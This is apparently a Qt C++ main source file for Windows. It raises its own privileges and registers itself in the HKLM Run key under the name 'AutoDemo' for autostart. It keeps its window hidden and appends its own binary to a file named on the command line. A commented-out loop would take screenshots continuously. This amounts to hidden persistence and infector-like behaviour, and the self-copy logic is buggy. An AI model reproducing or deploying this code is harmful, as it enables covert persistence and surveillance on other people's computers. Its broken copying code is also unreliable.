#include "mainwindow.h"
#include <QApplication>
#include <windows.h>
#include<sstream>
#include<fstream>
#include<QString>
#include<future>
#include <QTimer>

bool EnablePriviledge(LPCTSTR lpSystemName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp = {1};
    if (OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken)) {
        if (LookupPrivilegeValue(NULL,lpSystemName,&tkp.Privileges[0].Luid)) {
            tkp.PrivilegeCount = 1;
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,(PTOKEN_PRIVILEGES) NULL, 0);
            if (GetLastError() != ERROR_SUCCESS) {
                CloseHandle(hToken);
                return false;
            }
        }
        CloseHandle(hToken);
    }
    return true;
}

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    /*1.0*/
    HKEY hkey = {0};
    HANDLE hToken = nullptr;
    TOKEN_PRIVILEGES tkp={0};
    bool bRet;
        LONG lResult;
        bRet = EnablePriviledge(SE_BACKUP_NAME);
    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken);
    LookupPrivilegeValue(nullptr,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken,FALSE,&tkp,sizeof(tkp),nullptr,nullptr);

    wchar_t szPath[MAX_PATH] = L"E:\\ruanjian\\【2018-05-10】PotPlayer_1.7.11890_Dev\\PotPlayer\\PotPlayerMini.exe";
    GetModuleFileName(nullptr,szPath,MAX_PATH);
   int iret1= RegOpenKeyEx(HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE,&hkey);
    int iret =RegSetValueEx(hkey,L"AutoDemo",0,REG_SZ,(BYTE*)szPath,MAX_PATH);
    if(ERROR_SUCCESS==RegSetValueEx(hkey,L"AutoDemo",0,REG_SZ,(BYTE*)szPath,MAX_PATH))
    {
            RegCloseKey(hkey);
            //return 0 ;
}
    RegCloseKey(hkey);
    /*1.1*/
//    HANDLE hToken = nullptr;
//    TOKEN_PRIVILEGES tkp={0};
//    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken);
//    LookupPrivilegeValue(nullptr,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
//    tkp.PrivilegeCount = 1;
//    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
//    AdjustTokenPrivileges(hToken,FALSE,&tkp,sizeof(tkp),nullptr,nullptr);
    //ExitWindowsEx(EWX_POWEROFF,0);
    if(argc>1)
   {
        std::ofstream fileOut(argv[1],std::ios::binary|std::ios::app);
    int bufSize = WideCharToMultiByte(CP_ACP,NULL,szPath,-1,NULL,0,NULL,FALSE);
      char *ps = new char[bufSize];
      WideCharToMultiByte(CP_ACP,NULL,szPath,-1,ps,bufSize,NULL,FALSE);

    std::ifstream fileIn(ps,std::ios::binary);
    std::string appBin;
    fileIn>>appBin;
    fileOut<<appBin;
    fileIn.close();
    fileOut.close();
    }

    MainWindow w;
    //w.show();


//    std::async( std::launch::async,[&w](){
//        while(1)
//        {
//              //Sleep(1000);
//        w.getSceenPic(&w);
//        }
//    });

    return a.exec();
}

